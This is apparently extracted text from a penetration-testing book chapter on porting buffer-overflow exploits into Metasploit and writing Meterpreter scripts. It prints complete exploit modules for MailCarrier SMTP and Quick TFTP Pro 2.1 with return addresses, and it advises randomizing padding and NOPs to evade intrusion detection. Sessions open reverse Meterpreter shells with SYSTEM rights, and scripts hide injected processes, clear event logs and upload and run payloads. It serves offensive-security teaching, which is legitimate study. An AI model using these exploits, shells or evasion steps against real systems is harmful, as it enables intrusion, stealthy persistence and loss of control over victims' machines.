Let’s look at how we initially configure our exploit definition. We will need 
to feed the service a greeting as required by the protocol, a large buffer, a 
placeholder where we will take control of EIP, a brief NOP slide, and a place-
holder for our shellcode. Here’s the code:
[Word Count: 50]

def exploit
       connect
       
Xsploit = "EHLO "
Ysploit << "\x41" * 5093
Zsploit << "\x42" * 4
[sploit << "\x90" * 32
\sploit << "\xcc" * 1000
[Word Count: 27]

The malicious buffer is built based on the original exploit code begin-
ning with the EHLO command at X followed by a long string of As at Y (5093 
of them), 4 bytes to overwrite the EIP register at Z, a small NOP slide at [, 
and then some dummy shellcode at \.
[Word Count: 53]

In this case, we’ve selected an interrupt (breakpoint) at \ so that execution 
will pause when it reaches our shellcode without us having to set a breakpoint.
Having configured the exploit section, we save the file as mailcarrier_book.rb 
at modules/exploits/windows/smtp/.
[Word Count: 40]

In the next step, we load the module in msfconsole, set the required options, 
and configure a payload of generic/debug_trap (a great payload for exploit 
development that triggers a stop point when you are tracing the application 
in a debugger). Then we run the module:
[Word Count: 45]

msf > use exploit/windows/smtp/mailcarrier_book
msf exploit(mailcarrier_book) > show options
[Word Count: 9]

Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The local address
   RHOST                   yes       The target address
   RPORT  25               yes       The target port
[Word Count: 25]

Id  Name
   --  ----
   0   Windows XP SP2 - EN
[Word Count: 10]

msf exploit(mailcarrier_book) > set LHOST 192.168.1.101
LHOST => 192.168.1.101
msf exploit(mailcarrier_book) > set RHOST 192.168.1.155
RHOST => 192.168.1.155
X msf exploit(mailcarrier_book) > set payload generic/debug_trap
payload => generic/debug_trap
msf exploit(mailcarrier_book) > exploit
[*] Exploit completed, but no session was created.
msf exploit(mailcarrier_book) >
[Word Count: 43]

We set the options as if we were running a normal exploit, except that we 
use the generic/debug_trap payload X to test our exploit.
After the module runs, the debugger should pause with EIP overwritten 
by 42424242 as shown in Figure 15-1; if you see a successful EIP overwrite 
of 42424242, you know your exploit is working. Notice in Figure 15-1 that the 
EIP register points to 42424242 and that the NOP slide and the dummy pay-
load have made it into the buffer as expected.
[Word Count: 86]

Porting Exploits to the Metasploit Framework
221
[Word Count: 7]

Figure 15-1: MailCarrier initial overwrite
[Word Count: 5]

'Targets' =>
       [
              [ 'Windows XP SP2 - EN', { 'Ret' => 0x7d17dd13 } ],
       ],
[Word Count: 16]

Metasploit will add the return address into the exploit at run time. You can 
replace the return address in the exploit block with [target['Ret']].pack('V'). 
This will insert the target return address into the exploit, reversing the bytes 
in little-endian format. (The endian-ness is determined by the target CPU’s 
architecture, and processors that are Intel-compatible use little-endian byte 
ordering.)
[Word Count: 58]

NOTE
If you declared more than one target, this particular line would select the proper return 
address based on the target you selected when running the exploit. Notice how moving 
the exploit to the Framework is already adding versatility.
[Word Count: 39]

sploit = "EHLO "
sploit << "\x41" * 5093
sploit << [target['Ret']].pack('V')
sploit << "\x90" * 32
sploit << "\xcc" * 1000
[Word Count: 22]

Re-executing the exploit module should result in a successful jump to 
the INT3 dummy shellcode instructions, as shown in Figure 15-2.
[Word Count: 21]

Figure 15-2: A successful jump to dummy shellcode; we are at our user control’s INT3 
instructions.
[Word Count: 16]

Most intrusion detections systems will trigger an alert when they detect a long 
string of As traversing the network, because this is a common buffer pattern for 
exploits. Therefore, it’s best to introduce as much randomization as possible 
into your exploits, because doing so will break many exploit-specific signatures. 
To add randomness to this exploit, edit the 'Targets' section in the super 
block to include the offset amount required prior to overwriting EIP, as 
shown here:
[Word Count: 76]

'Targets' =>
       [
X[ 'Windows XP SP2 - EN', { 'Ret' => 0x7d17dd13, 'Offset' => 5093 } ],
       ],
[Word Count: 19]

Porting Exploits to the Metasploit Framework
223
[Word Count: 7]

sploit = "EHLO "
sploit << rand_text_alpha_upper(target['Offset']
sploit << [target['Ret']].pack('V')
sploit << "\x90" * 32
sploit << "\xcc" * 1000
[Word Count: 20]

As you can see, the string of As will be replaced with a random string of 
uppercase alphanumeric characters. And when we run the module again, it 
still works properly.
[Word Count: 30]

Our next step is to remove the very obvious NOP slide, because this is another 
item that often triggers intrusion detection systems. Although \x90 is the best-
known no-operation instruction, it isn’t the only one available. We can use 
the make_nops() function to tell Metasploit to use random NOP-equivalent 
instructions in the module:
[Word Count: 53]

sploit = "EHLO "
sploit << rand_text_alpha_upper(target['Offset'])
sploit << [target['Ret']].pack('V')
sploit << make_nops(32)
sploit << "\xcc" * 1000
[Word Count: 18]

We run the module again and check our debugger, which should be 
paused again on the INT3 instructions. The familiar NOP slide has been 
replaced by seemingly random characters, as shown in Figure 15-3.
[Word Count: 34]

With everything in the module working correctly, we can now remove the 
dummy shellcode. The encoder will exclude the bad characters declared in 
the module super block.
[Word Count: 27]

sploit = "EHLO "
sploit << rand_text_alpha_upper(target['Offset'])
sploit << [target['Ret']].pack('V')
sploit << make_nops(32)
sploit << payload.encoded
[Word Count: 16]

Figure 15-3: Randomized MailCarrier buffer
[Word Count: 5]

The payload.encoded function tells Metasploit to append the indicated 
payload to the end of the malicious string at run time. 
Now, when we load our module, set a real payload, and execute it, we 
should be presented with our hard-earned shell, as shown here:
[Word Count: 44]

msf exploit(mailcarrier_book) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(mailcarrier_book) > exploit
[Word Count: 13]

[*] Started reverse handler on 192.168.1.101:4444
[*] Sending stage (747008 bytes)
[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.155:1265)
[Word Count: 19]

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
[Word Count: 9]

Just to wrap things up, here is the complete and final code for this Metasploit 
exploit module:
[Word Count: 17]

class Metasploit3 < Msf::Exploit::Remote
       Rank = GoodRanking
       
       include Msf::Exploit::Remote::Tcp
[Word Count: 9]

Porting Exploits to the Metasploit Framework
225
[Word Count: 7]

handler
              disconnect
        end
[Word Count: 3]

You’ve just completed your first port of a buffer overflow exploit to 
Metasploit!
[Word Count: 13]

NOTE
To learn more about SEH overwrites, see http://www.exploit-db.com/download_pdf/
10195/.
[Word Count: 10]

The Quick TFTP Pro 2.1 exploit was written by Muts. You can find the code 
for the complete exploit as well as the application at http://www.exploit-db.com/
exploits/5315/. We’ve stripped down the exploit here to make it simpler to port 
into Metasploit—for example, we’ve stripped out the payload. The remaining 
skeleton has all of the information we’ll need to use the exploit in Metasploit.
[Word Count: 63]

#!/usr/bin/python
# Quick TFTP Pro 2.1 SEH Overflow (0day)
# Tested on Windows XP SP2. 
# Coded by Mati Aharoni
# muts..at..offensive-security.com
# http://www.offensive-security.com/0day/quick-tftp-poc.py.txt
#########################################################
import socket
import sys
[Word Count: 29]

Porting Exploits to the Metasploit Framework
227
[Word Count: 7]

print "[*] Quick TFTP Pro 2.1 SEH Overflow (0day)"
print "[*] http://www.offensive-security.com"
 
host = '127.0.0.1'
port = 69
 
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
    print "socket() failed"
    sys.exit(1)
 
filename = "pwnd"
shell = "\xcc" * 317
 
mode = "A"*1019+"\xeb\x08\x90\x90"+"\x58\x14\xd3\x74"+"\x90"*16+shell
 
muha = "\x00\x02" + filename+ "\0" + mode + "\0"
 
print "[*] Sending evil packet, ph33r"
s.sendto(muha, (host, port))
print "[*] Check port 4444 for bindshell"
[Word Count: 65]

As we did with our previous JMP ESP example, we first create a skeleton for 
our new module by using a base example of an exploit similar to the one we used 
previously:
[Word Count: 33]

class Metasploit3 < Msf::Exploit::Remote
       
Xinclude Msf::Exploit::Remote::Udp
Yinclude Msf::Exploit::Remote::Seh
[Word Count: 8]

def initialize(info = {})
              super(update_info(info,
                     'Name'           => 'Quick TFTP Pro 2.1 Long Mode Buffer Overflow',
                     'Description'    => %q{
                            This module exploits a stack overflow in Quick TFTP Pro 2.1.
                     },
                     'Author'         => 'Your Name',
                     'Version'        => '$Revision: 7724 $',
                     'References'     => 
                            [ 
                                    ['CVE', '2008-1610'],
                                    ['OSVDB', '43784'],
                                    ['URL', 'http://www.exploit-db.com/exploits/5315'],
                            ],
                     'DefaultOptions' =>
                            {
                                   'EXITFUNC' => 'thread',
                            },
[Word Count: 56]

'Payload'        =>
                            {
                                   'Space'    => 412,
                                   'BadChars' => "\x00\x20\x0a\x0d",
                                   'StackAdjustment' => -3500,
                            },
                     'Platform'       => 'win',
                     'Targets'        =>
                            [
                                    [ 'Windows XP SP2',    { 'Ret' => 0x41414141 } ],
                            ],
                     'Privileged'     => true,
                     'DefaultTarget'  => 0,
                     'DisclosureDate' => 'Mar 3 2008'))
[Word Count: 41]

Zregister_options([Opt::RPORT(69)], self.class)
[Word Count: 2]

def exploit
              connect_udp
              
              print_status("Trying target #{target.name}...")
[Word Count: 6]

print_status("Trying target #{target.name}...")
[Word Count: 3]

evil = "\x41" * 1019
Xevil << "\xeb\x08\x90\x90"  # Short Jump
Yevil << "\x58\x14\xd3\x74"  # POP-POP-RETN
       evil << "\x90" * 16  # NOP slide
       evil << "\xcc" * 412  # Dummy Shellcode
[Word Count: 32]

Porting Exploits to the Metasploit Framework
229
[Word Count: 7]

Zsploit = "\x00\x02"
       sploit << "pwnd"
       sploit << "\x00"
       sploit << evil
       sploit << "\x00"
[Word Count: 15]

Figure 15-4: Quick TFTP's initial SEH overwrite
[Word Count: 7]

Because that long string of As and the NOP slide sent to the application 
will set off IDS alarms, we’ll replace the As (as in the previous example) with 
a random selection of uppercase alphabetic characters, and replace the \x90 
characters with NOP equivalents, as shown in the following boldface code:
[Word Count: 51]

evil = rand_text_alpha_upper(1019)   # Was: "\x41" * 1019
evil << "\xeb\x08\x90\x90"           # Short Jump
evil << "\x58\x14\xd3\x74"           # pop/pop/ret
evil << make_nops(16)                # Was: "\x90" * 16  # NOP slide
evil << "\xcc" * 412                 # Dummy Shellcode
[Word Count: 38]

As always, it’s a good idea to check your new module’s functionality after 
every change. As you can see in Figure 15-5, the random characters have been 
accepted by the application and SEH is still controlled as it was before.
[Word Count: 40]

Figure 15-5: Quick TFTP buffer with random characters
[Word Count: 8]

Now that we know that the module is still behaving properly, we can set 
the return address in the 'Targets' definition. The address in this example is 
a POP-POP-RETN from oledlg.dll, as in the original exploit. Remember that if 
we can find a memory instruction set in the same application that is loaded 
every time, we can create a universal exploit that is not dependent on Microsoft 
DLLs and that can target every operating system. In this case, we use oledlg.dll 
to make this exploit universal.
[Word Count: 86]

'Targets'        =>
      [
X[ 'Windows XP SP2',  { 'Ret' => 0x74d31458 } ], # p/p/r oledlg
      ],
[Word Count: 17]

We now have our target of Windows XP SP2 and a return address of 
0x74d31458, as shown at X.
Next, we create a random, alphabetical, uppercase string of 1019 bytes:
[Word Count: 30]

evil = rand_text_alpha_upper(1019)
evil << generate_seh_payload(target.ret)
evil << make_nops(16)
[Word Count: 9]

Porting Exploits to the Metasploit Framework
231
[Word Count: 7]

Figure 15-6: Quick TFTP fully controlled
[Word Count: 6]

Next, we remove the dummy shellcode and run the module with a real 
payload to get our shell, as shown here:
[Word Count: 21]

msf > use exploit/windows/tftp/quicktftp_book
msf exploit(quicktftp_book) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(quicktftp_book) > set LHOST 192.168.1.101
LHOST => 192.168.1.101
msf exploit(quicktftp_book) > set RHOST 192.168.1.155
RHOST => 192.168.1.155
msf exploit(quicktftp_book) > exploit
[Word Count: 35]

[*] Started reverse handler on 192.168.1.101:4444
[*] Trying target Windows XP SP2...
[*] Sending stage (747008 bytes)
[*] Meterpreter session 2 opened (192.168.1.101:4444 -> 192.168.1.155:1036)
meterpreter > getuid
Server username: V-XP-SP2-BARE\Administrator
[Word Count: 31]

Now that we have our Meterpreter shell, we’ve successfully ported an 
exploit and used the Framework in an SEH exploit!
[Word Count: 20]

class Metasploit3 < Msf::Exploit::Remote
        include Msf::Exploit::Remote::Udp
        include Msf::Exploit::Remote::Seh
[Word Count: 8]

def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Quick TFTP Pro 2.1 Long Mode Buffer Overflow',
                        'Description'    => %q{
                                This module exploits a stack overflow in Quick TFTP Pro 2.1.
                        },
[Word Count: 30]

'Author'         => 'Your Name',
                        'Version'        => '$Revision: 7724 $',
                        'References'     => 
                                [ 
                                         ['CVE', '2008-1610'],
                                         ['OSVDB', '43784'],
                                         ['URL', 'http://www.exploit-db.com/exploits/5315'],
                                ],
                        'DefaultOptions' =>
                                {
                                         'EXITFUNC' => 'thread',
                                },
                        'Payload'        =>
                                {
                                         'Space'    => 412,
                                         'BadChars' => "\x00\x20\x0a\x0d",
                                         'StackAdjustment' => -3500,
                                },
                        'Platform'       => 'win',
                        'Targets'        =>
                                [
                                         [ 'Windows XP SP2',     { 'Ret' => 0x74d31458 } ], 
# p/p/r oledlg
                                ],
                        'Privileged'     => true,
                        'DefaultTarget'  => 0,
                        'DisclosureDate' => 'Mar 3 2008'))
[Word Count: 70]

register_options([Opt::RPORT(69)], self.class)
[Word Count: 2]

print_status("Trying target #{target.name}...")
[Word Count: 3]

evil = rand_text_alpha_upper(1019)
                evil << generate_seh_payload(target.ret)
                evil << make_nops(16)
[Word Count: 9]

sploit = "\x00\x02"
                sploit << "pwnd"
                sploit << "\x00"
                sploit << evil
                sploit << "\x00"
[Word Count: 15]

Porting Exploits to the Metasploit Framework
233
[Word Count: 7]

M E T E R P R E T E R  S C R I P T I N G
[Word Count: 20]

Metasploit’s powerful scripting environment lets you 
add features or options to Meterpreter. In this chapter, 
you’ll learn the basics of Meterpreter scripting, some 
useful native calls, and learn how to run these com-
mands from within Meterpreter. We’ll cover two ways
to leverage Meterpreter scripting. The first method is somewhat outdated 
but still important, because not all scripts have been converted. The second 
method is nearly identical to the one discussed in Chapter 13, so we won’t 
cover it in detail in this chapter. (Special thanks to Carlos Perez [darkoperator] 
for his contributions to this chapter.)
[Word Count: 96]

All Meterpreter scripts are located under the Framework root under scripts/
meterpreter/. To show a listing of all scripts, press the TAB key in a Meterpreter 
shell, enter run, and press TAB again.
Let’s dissect a simple Meterpreter script and then build our own. We’ll 
explore the multi_meter_inject script that injects Meterpreter shells into
[Word Count: 54]

different processes. To begin, take a look at this script in Meterpreter to see 
what flags and syntax are included:
[Word Count: 20]

meterpreter > run multi_meter_inject -h
Meterpreter script for injecting a reverse tcp Meterpreter payload into memory space of 
multiple PID's. If none is provided, notepad.exe will be spawned and the meterpreter 
payload injected into it.
[Word Count: 35]

-h
Help menu.
    -m X 
Start Exploit multi/handler for return connection
    -mp Y<opt>
Provide Multiple PID for connections separated by comma one per IP.
    -mr Z<opt>
Provide Multiple IP Addresses for Connections separated by comma.
    -p [<opt>
The port on the remote host where Metasploit is listening (default: 4444)
    -pt
<opt>
Specify Reverse Connection Meterpreter Payload. Default windows/
meterpreter/reverse_tcp
[Word Count: 59]

PID   Name                 Arch  Session  User                  Path
 ---   ----                 ----  -------  ----                  ----
 0     [System Process]
 4     System
 256   smss.exe
 364   csrss.exe
 412   wininit.exe
 424   csrss.exe
 472   winlogon.exe
 516   services.exe
 524   lsass.exe
 532   lsm.exe
2808  iexplorer.exe X
x86   
meterpreter >
[Word Count: 39]

We’ll inject our new Meterpreter shell into the iexplorer.exe X process. 
This will spawn a second Meterpreter console completely within memory and 
will never write data to the disk.
Let’s run the multi_meter_inject command using some of the switches we 
reviewed earlier to see if it works:
[Word Count: 47]

meterpreter > run multi_meter_inject -mp 2808 -mr 172.16.32.129 -p 443
[*] Creating a reverse meterpreter stager: LHOST=172.16.32.129 LPORT=443
[*] Injecting meterpreter into process ID 2808
[*] Allocated memory at address 0x03180000, for 290 byte stager
[*] Writing the stager into memory...
[*] Sending stage (749056 bytes) to 172.16.32.170
[+] Successfully injected Meterpreter in to process: 2808
X [*] Meterpreter session 3 opened (172.16.32.129:443 -> 172.16.32.170:1098) at 
Tue Nov 30 22:37:29 -0500 2010
meterpreter >
[Word Count: 74]

As this output indicates, our command was successful and a new Meter-
preter session has been opened, as shown at X.
Now that you understand what this script can do, let’s examine how it 
works. We’ll break the script into chunks to help us parse its commands and 
overall structure.
First, variables and definitions are defined and the flags we want to pass 
to Meterpreter are set up:
[Word Count: 68]

# $Id: multi_meter_inject.rb 10901 2010-11-04 18:42:36Z darkoperator $
# $Revision: 10901 $
# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-----------------------------------------------------------------------------
################## Variable Declarations ##################
[Word Count: 23]

At the beginning of this section of script, notice that several variables are 
defined for later use. For example, pid = nil at X creates a PID variable but 
its value is not set. The @exec_opts = Rex::Parser::Arguments.new( section at Y 
defines the additional help commands and flags that will be used.
The next section defines functions that we will call later:
[Word Count: 62]

################## Function Declarations ##################
[Word Count: 4]

# Usage Message Function
#-------------------------------------------------------------------------------
X def usage 
        print_line "Meterpreter Script for injecting a reverse tcp Meterpreter Payload"
        print_line "in to memory of multiple PID's, if none is provided a notepad process."
        print_line "will be created and a Meterpreter Payload will be injected in to each."
        print_line(@exec_opts.usage)
        raise Rex::Script::Completed
end
[Word Count: 50]

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
        print_error("#{meter} version of Meterpreter is not supported with this Script!")
        raise Rex::Script::Completed
end
[Word Count: 24]

# Function for injecting payload in to a given PID
#-------------------------------------------------------------------------------
Y def inject(target_pid, payload_to_inject)
        print_status("Injecting meterpreter into process ID #{target_pid}")
        begin
                host_process = @client.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS)
                raw = payload_to_inject.generate
Zmem = host_process.memory.allocate(raw.length + (raw.length % 1024))
[Word Count: 36]

print_status("Allocated memory at address #{"0x%.8x" % mem}, for 
#{raw.length} byte stager")
                print_status("Writing the stager into memory...")
[host_process.memory.write(mem, raw) 
\host_process.thread.create(mem, 0) 
                print_good("Successfully injected Meterpreter in to process: #{target_pid}")
        rescue::Exception => e
                print_error("Failed to Inject Payload to #{target_pid}!")
                print_error(e)
        end
end
[Word Count: 39]

In this example, the function usage at X will be called when the -h flag is 
set. You can call a number of Meterpreter functions directly from the Meter-
preter API. This functionality simplifies certain tasks, such as injecting into a 
new process with the def inject function, as shown at Y.
The next important element is the host_process.memory.allocate call at Z, 
which will allow us to allocate memory space for our Meterpreter payload.
[Word Count: 74]

We then write the memory to our process using host_process.memory.write at [ 
and create a new thread using host_process.thread.create at \.
Next we define the multi-handler that handles the connections based 
on the selected payload, as shown in boldface in the following output. (The 
default is Meterpreter, so the multi-handler will handle Meterpreter sessions 
unless otherwise specified.)
[Word Count: 57]

# Function for creation of connection handler
#-------------------------------------------------------------------------------
def create_multi_handler(payload_to_inject)
        mul = @client.framework.exploits.create("multi/handler")
        mul.share_datastore(payload_to_inject.datastore)
        mul.datastore['WORKSPACE'] = @client.workspace
        mul.datastore['PAYLOAD'] = payload_to_inject
        mul.datastore['EXITFUNC'] = 'process'
        mul.datastore['ExitOnSession'] = true
        print_status("Running payload handler")
        mul.exploit_simple(
                'Payload'  => mul.datastore['PAYLOAD'],
                'RunAsJob' => true
        )
[Word Count: 37]

The pay = client.framework.payloads.create(payload) call in the following 
section allows us to create a payload from the Metasploit Framework. Because 
we know this is a Meterpreter payload, Metasploit will automatically generate 
it for us.
[Word Count: 34]

# Function for Creating the Payload
#-------------------------------------------------------------------------------
def create_payload(payload_type,lhost,lport)
        print_status("Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}")
        payload = payload_type
        pay = client.framework.payloads.create(payload)
        pay.datastore['LHOST'] = lhost
        pay.datastore['LPORT'] = lport
        return pay
end
[Word Count: 31]

The next option spawns a process using Notepad by default. If we didn’t 
specify a process, it would have created a Notepad process for us automatically.
[Word Count: 26]

# Function that starts the notepad.exe process
#-------------------------------------------------------------------------------
def start_proc()
        print_good("Starting Notepad.exe to house Meterpreter Session.")
        proc = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
        print_good("Process created with pid #{proc.pid}")
        return proc.pid
end
[Word Count: 32]

The boldfaced call lets us execute any command on the operating system. 
Notice that Hidden is set to true. This means that the user on the other side 
(the target) will not see anything; if Notepad is opened, it will run without 
the target user’s knowledge.
Next we call our functions, throw if statements, and start the payload:
[Word Count: 58]

################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
        case opt
        when "-h"
                usage
        when "-p"
                lport = val.to_i
        when "-m"
                start_handler = true
        when "-pt"
                payload_type = val
        when "-mr"
                multi_ip = val.split(",")
        when "-mp"
                multi_pid = val.split(",")
        end
}
[Word Count: 40]

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
# Create a Multi Handler is Desired
create_multi_handler(payload_type) if start_handler
[Word Count: 21]

Finally, we go through a couple of checks, make sure the syntax is correct, 
and inject our new Meterpreter session into our PID:
[Word Count: 23]

if multi_ip
        if multi_pid
                if multi_ip.length == multi_pid.length
                        pid_index = 0
                        multi_ip.each do |i|
                                payload = create_payload(payload_type,i,lport)
                                inject(multi_pid[pid_index],payload)
                                select(nil, nil, nil, 5)
                                pid_index = pid_index + 1
                        end
                else
                        multi_ip.each do |i|
                                payload = create_payload(payload_type,i,lport)
                                inject(start_proc,payload)
                                select(nil, nil, nil, 2)
                        end
                end
        end
[Word Count: 43]

else
        print_error("You must provide at least one IP!")
end
[Word Count: 9]

During a penetration test, you might be unable to find an existing script that 
matches what you need in order to perform a required task. If you under-
stand the basic concepts of programming, it should be relatively easy for you 
to pick up the Ruby syntax and use it to write additional scripts.
Let’s start off with a basic print statement that uses the interactive Ruby 
shell, also known as irb. From the Meterpreter console, issue the irb command 
and begin typing commands:
[Word Count: 84]

meterpreter > irb 
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
>>
[Word Count: 16]

After you are inside the interactive shell, you can use it to test the differ-
ent API calls from Meterpreter.
[Word Count: 20]

Let’s start with the print_line() call, which will print the output and add a 
carriage return at the end:
[Word Count: 19]

>> print_line("you have been pwnd!")
you have been pwnd!
=> nil
[Word Count: 11]

The next call is print_status() and is used most often in the scripting 
language. This call will provide a carriage return and print the status of what-
ever is executing, with a [*] prefixed at the beginning:
[Word Count: 37]

>> print_status("you have been pwnd!")
[*] you have been pwnd!
=> nil
[Word Count: 12]

The next call is print_good(), which is used to provide the results of an 
action or to indicate that the action was successful:
[Word Count: 23]

>> print_good("you have been pwnd")
[+] you have been pwnd
=> nil
[Word Count: 12]

The next call is print_error(), which is used to provide an error message 
or to indicate that an action was not possible:
[Word Count: 22]

>> print_error("you have been pwnd!")
[-] you have been pwnd!
=> nil
[Word Count: 12]

Meterpreter includes many API calls that you can use in your scripts to provide 
additional functionality or customization. You can use several reference points 
for these API calls. The one most often used by scripting newbies looks at how 
the Meterpreter console user interface (UI) uses the calls; these can be used 
as a base to continue writing scripts. To access this code, read the files under 
/opt/framework3/msf3/lib/rex/post/meterpreter/ui/console/command_dispatcher/ in 
Back|Track. If you create a listing of the folder contents, you can see the files 
that contain various commands that you can use:
[Word Count: 92]

root@bt:~# ls -F /opt/framework3/msf3/lib/rex/post/meterpreter/ui/console/
command_dispatcher/
[Word Count: 5]

core.rb  espia.rb  incognito.rb  networkpug.rb  priv/  priv.rb  sniffer.rb  
stdapi/  stdapi.rb
[Word Count: 9]

Within these scripts are the various Meterpreter core, desktop interaction, 
privileged operations, and many more commands. Review these scripts to 
become intimately familiar with how Meterpreter operates within a compro-
mised system.
[Word Count: 32]

The Meterpreter mixins are a series of calls that represent the most common 
tasks undertaken in a Meterpreter script. These calls are not available in irb 
and can be used only when creating a script for Meterpreter. Following is a 
list of some of the most notable calls:
[Word Count: 48]

cmd_exec(cmd)
Executes the given command as hidden and channelized. 
The output of the command is provided as a multiline string.
[Word Count: 20]

eventlog_clear(evt = "")
Clears a given event log or all event logs if none 
is given. Returns an array of event logs that were cleared.
[Word Count: 25]

eventlog_list()
Enumerates the event logs and returns an array contain-
ing the names of the event logs.
[Word Count: 17]

file_local_digestmd5(file2md5)
Returns a string with the MD5 checksum 
of a given local file.
[Word Count: 13]

file_local_digestsha1(file2sha1)
Returns a string with the SHA1 check-
sum of a given local file.
[Word Count: 14]

file_local_digestsha2(file2sha2)
Returns a string with the SHA256 
checksum of a given local file.
[Word Count: 13]

file_local_write(file2wrt, data2wrt)
Writes a given string to a specified file.
[Word Count: 10]

is_admin?()
Identifies whether or not the user is an admin. Returns true 
if the user is an admin and false if not.
[Word Count: 22]

is_uac_enabled?()
Determines whether User Account Control (UAC) is 
enabled on the system.
[Word Count: 12]

registry_createkey(key)
Creates a given registry key and returns true if 
successful.
[Word Count: 11]

registry_deleteval(key,valname)
Deletes a registry value given the key 
and value name. Returns true if successful.
[Word Count: 15]

registry_delkey(key)
Deletes a given registry key and returns true if 
successful.
[Word Count: 11]

registry_enumkeys(key)
Enumerates the subkeys of a given registry key 
and returns an array of subkeys.
[Word Count: 15]

registry_enumvals(key)
Enumerates the values of a given registry key and 
returns an array of value names.
[Word Count: 16]

registry_getvaldata(key,valname)
Returns the data of a given registry key 
and its value.
[Word Count: 12]

registry_getvalinfo(key,valname)
Returns the data and type of a given 
registry key and its value.
[Word Count: 14]

registry_setvaldata(key,valname,data,type)
Sets the data for a given 
value and type of data on the target registry. Returns true if successful.
[Word Count: 20]

service_change_startup(name,mode)
Changes a given service startup mode. 
The name and the mode must be provided. The mode is a string set with 
either a corresponding auto, manual, or disable setting. The service name 
is case sensitive.
[Word Count: 36]

service_create(name, display_name, executable_on_host,startup=2)
Function 
for the creation of a service that runs its own process. Its parameters are 
the service name as a string, the display name as a string, the path of the 
executable on the host that will execute at startup as a string, and the 
startup type as an integer: 2 for Auto, 3 for Manual, or 4 for Disable 
(default is Auto).
[Word Count: 66]

service_delete(name)
Function for deleting a service by deleting the key 
in the registry.
[Word Count: 13]

service_info(name)
Gets Windows service information. The information 
is returned in a hash with display name, startup mode, and command 
executed by the service. The service name is case sensitive. Hash keys are 
Name, Start, Command, and Credentials.
[Word Count: 37]

service_list()
Lists all Windows services present. Returns an array con-
taining the services’ names.
[Word Count: 14]

service_start(name)
Function for service startup. Returns 0 if the service 
is started, 1 if the service is already started, and 2 if service is disabled.
[Word Count: 25]

service_stop(name)
Function for stopping a service. Returns 0 if the 
service is stopped successfully, 1 if the service is already stopped or 
disabled, and 2 if the service cannot be stopped.
[Word Count: 31]

You should understand the basics regarding the Meterpreter mixin calls 
that you can use to add functionality to your custom script.
[Word Count: 21]

When creating Meterpreter scripts, you need to understand the following 
rules before you begin your first script and if you want them to be committed 
to the Framework:
[Word Count: 28]

z
Use only instance, local, and constant variables; never use global or class 
variables because they might interfere with the Framework variables.
[Word Count: 22]

z
Use hard tabs for indenting; do not use spaces.
[Word Count: 10]

z
For code blocks, do not use {}. Instead, use do and end.
[Word Count: 13]

z
When declaring functions, always write a comment before the declara-
tion and provide a brief description of its purpose.
[Word Count: 20]

z
Do not use sleep; use "select(nil, nil, nil, <time>)".
[Word Count: 10]

z
Do not use puts or any other standard output calls; instead use print, 
print_line, print_status, print_error, and print_good.
[Word Count: 19]

z
Always include an -h option that will print a description and the purpose 
of the script and show the available options.
[Word Count: 22]

z
If your script is meant for a specific operating system or Meterpreter plat-
form, make sure it runs only on those platforms and prints out an error 
message for an unsupported OS or platform.
[Word Count: 35]

Open up your favorite editor and create a new file called execute_upload.rb, 
located in scripts/meterpreter/. We’ll start by adding comments to the top of the 
file to let everyone know the purpose of this script and to define our options 
for the script:
[Word Count: 43]

# Meterpreter script for uploading and executing another meterpreter exe
[Word Count: 10]

info = "Simple script for uploading and executing an additional meterpreter payload"
[Word Count: 12]

opts = Rex::Parser::Arguments.new(
        X"-h"  => [ false,   "This help menu. Spawn a meterpreter shell by uploading and 
executing."],
        Y"-r"  => [ true,    "The IP of a remote Metasploit listening for the connect back"],
        Z"-p"  => [ true,    "The port on the remote host where Metasploit is listening 
(default: 4444)"]
)
[Word Count: 50]

filename= Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
rhost    = Rex::Socket.source_address("1.2.3.4")
rport    = 4444
lhost    = "127.0.0.1"
pay      = nil
[Word Count: 16]

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
        case opt
        when "-h"
                print_line(info)
                print_line(opts.usage)
                raise Rex::Script::Completed
[Word Count: 18]

when "-r"
                rhost = valX
        when "-p"
                rport = val.to_iY
[Word Count: 10]

Notice that we broke out each argument and assigned values or print infor-
mation back to the user. The rhost = val X means “take the value presented 
from the user when -r was input.” The rport = val.to_i Y simply assigns the 
value as an integer (it will always need to be an integer for a port number).
In the next series, we define everything we need to create our payload:
[Word Count: 72]

X payload = "windows/meterpreter/reverse_tcp"
Y pay = client.framework.payloads.create(payload)
pay.datastore['LHOST'] = rhost
pay.datastore['LPORT'] = rport
mul = client.framework.exploits.create("multi/handler")
mul.share_datastore(pay.datastore)
mul.datastore['WORKSPACE'] = client.workspace
[Word Count: 21]

mul.datastore['PAYLOAD'] = payload
mul.datastore['EXITFUNC'] = 'process'
mul.datastore['ExitOnSession'] = true
mul.exploit_simple(
'Payload'  => mul.datastore['PAYLOAD'],
'RunAsJob' => true
 )
[Word Count: 17]

We define our payload as a windows/meterpreter/reverse_tcp at X, generate 
the payload calling the client.framework.payloads.create(payload) at Y, and 
specify the necessary parameters to create the multi-handler. These are all 
the required fields we need to set our payload using the LHOST and LPORT options 
and create a listener.
Next we create our executable (win32pe meterpreter), upload it to our 
target machine, and execute it:
[Word Count: 64]

Ytempdir = client.fs.file.expand_path("%TEMP%")
        print_status("Uploading meterpreter to temp directory...")
        raw = pay.generate
Zexe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
        tempexe = tempdir + "\\" + filename
        tempexe.gsub!("\\\\", "\\")
        fd = client.fs.file.new(tempexe, "wb")
        fd.write(exe)
fd.close
        print_status("Executing the payload on the system...")
